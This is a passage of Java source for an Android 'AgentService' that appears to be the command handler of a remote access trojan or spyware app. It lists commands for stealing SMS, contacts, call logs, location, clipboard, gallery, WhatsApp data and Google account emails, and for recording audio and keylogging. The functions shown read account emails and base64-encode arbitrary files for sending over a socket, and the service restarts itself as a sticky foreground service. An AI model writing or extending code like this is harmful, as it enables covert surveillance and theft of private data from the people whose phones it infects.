        } catch (Exception e) {
            return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
        }
    }

    private String getAccountTypeDescription(String type) {
        switch (type) {
            case "com.google": return "Google Account";
            case "com.facebook.auth.login": return "Facebook Account";
            case "com.whatsapp": return "WhatsApp Account";
            default: return type;
        }
    }

    private String getGoogleAccounts() {
        try {
            if (!hasPermission(android.Manifest.permission.GET_ACCOUNTS)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                return result.toString();
            }

            AccountManager accountManager = AccountManager.get(this);
            Account[] accounts = accountManager.getAccountsByType("com.google");

            JSONArray accountsArray = new JSONArray();
            for (Account account : accounts) {
                JSONObject accObj = new JSONObject();
                accObj.put("email", account.name);
                accObj.put("type", "Google");
                accountsArray.put(accObj);
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", accountsArray.length());
            result.put("data", accountsArray);
            return result.toString();

        } catch (Exception e) {
            return "{\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    // ==================== FILE DOWNLOAD ====================

    private String downloadFile(String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "File not found: " + filePath);
                return result.toString();
            }

            FileInputStream fis = new FileInputStream(file);
            byte[] fileData = new byte[(int) file.length()];
            fis.read(fileData);
            fis.close();

            String encoded = Base64.encodeToString(fileData, Base64.NO_WRAP);

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("type", "file_download");
            result.put("filename", file.getName());
            result.put("path", filePath);
            result.put("size", file.length());
            result.put("size_formatted", formatFileSize(file.length()));
            result.put("data", encoded);
            return result.toString();

        } catch (Exception e) {
            return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
        }
    }

    // ==================== HELP ====================

    private String getHelp() {
        JSONObject help = new JSONObject();
        try {
            JSONArray commands = new JSONArray();
            String[] cmdList = {
                "GET_DEVICE_INFO", "GET_LOCATION", "GET_CLIPBOARD", "GET_INSTALLED_APPS",
                "GET_CONTACTS", "GET_SMS", "GET_CALL_LOGS", "GET_GALLERY", "GET_FILES_LIST",
                "RECORD_AUDIO", "STOP_RECORDING",
                "KEYLOG_START", "KEYLOG_STOP", "KEYLOG_DUMP",
                "WA_INFO", "WA_CONTACTS",
                "GET_ACCOUNTS", "GET_GOOGLE_ACCOUNTS",
                "SHOW_TOAST", "HELP"
            };
            for (String cmd : cmdList) {
                commands.put(cmd);
            }
            help.put("status", "success");
            help.put("commands", commands);
            help.put("count", commands.length());
            return help.toString();
        } catch (JSONException e) {
            return "{\"error\":\"Help generation failed\"}";
        }
    }

    // ==================== HELPER METHODS ====================

    private String getColumnValue(Cursor cursor, String columnName) {
        int index = cursor.getColumnIndex(columnName);
        return (index >= 0) ? cursor.getString(index) : null;
    }

    private String getBatteryPercentage() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                if (level >= 0 && scale > 0) {
                    return String.valueOf((level * 100) / scale) + "%";
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery error", e);
        }
        return "Unknown";
    }

    private boolean isCharging() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                       status == android.os.BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception e) {
            Log.e(TAG, "Charging check error", e);
        }
        return false;
    }

    private String getTotalStorage() {
        try {
            android.os.StatFs stat = new android.os.StatFs(Environment.getDataDirectory().getPath());
            long total = stat.getBlockCountLong() * stat.getBlockSizeLong();
            return formatFileSize(total);
        } catch (Exception e) {
            return "Unknown";
        }
    }

    private String getFreeStorage() {
        try {
            android.os.StatFs stat = new android.os.StatFs(Environment.getDataDirectory().getPath());
            long free = stat.getAvailableBlocksLong() * stat.getBlockSizeLong();
            return formatFileSize(free);
        } catch (Exception e) {
            return "Unknown";
        }
    }

    private String getScreenResolution() {
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
            if (wm != null) {
                wm.getDefaultDisplay().getMetrics(metrics);
                return metrics.widthPixels + "x" + metrics.heightPixels;
            }
        } catch (Exception e) {
            Log.e(TAG, "Screen resolution error", e);
        }
        return "Unknown";
    }

    private String formatFileSize(long size) {
        if (size <= 0) return "0 B";
        String[] units = {"B", "KB", "MB", "GB", "TB"};
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return String.format("%.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
    }

    private void updateNotification(String text) {
        startForeground(1, getNotification(text));
    }

    private void showToast(String message) {
        mainHandler.post(() -> Toast.makeText(AgentService.this, message, Toast.LENGTH_SHORT).show());
    }

    // ==================== CLOSE CONNECTION ====================

    private void closeConnection() {
        try {
            if (in != null) { try { in.close(); } catch (Exception e) {} in = null; }
            if (out != null) { try { out.close(); } catch (Exception e) {} out = null; }
            if (socket != null) { try { socket.close(); } catch (Exception e) {} socket = null; }
        } catch (Exception e) {
            Log.e(TAG, "Close error", e);
        }
        isConnected.set(false);
    }

    // ==================== LIFECYCLE ====================

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning.set(false);
        isRecording = false;
        isKeylogging = false;
        closeConnection();
        try {
            if (mediaRecorder != null) mediaRecorder.release();
        } catch (Exception e) {}
        
        // Shutdown thread pools
        commandExecutor.shutdown();
        responseExecutor.shutdown();
        
        showToast("Agent Stopped");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
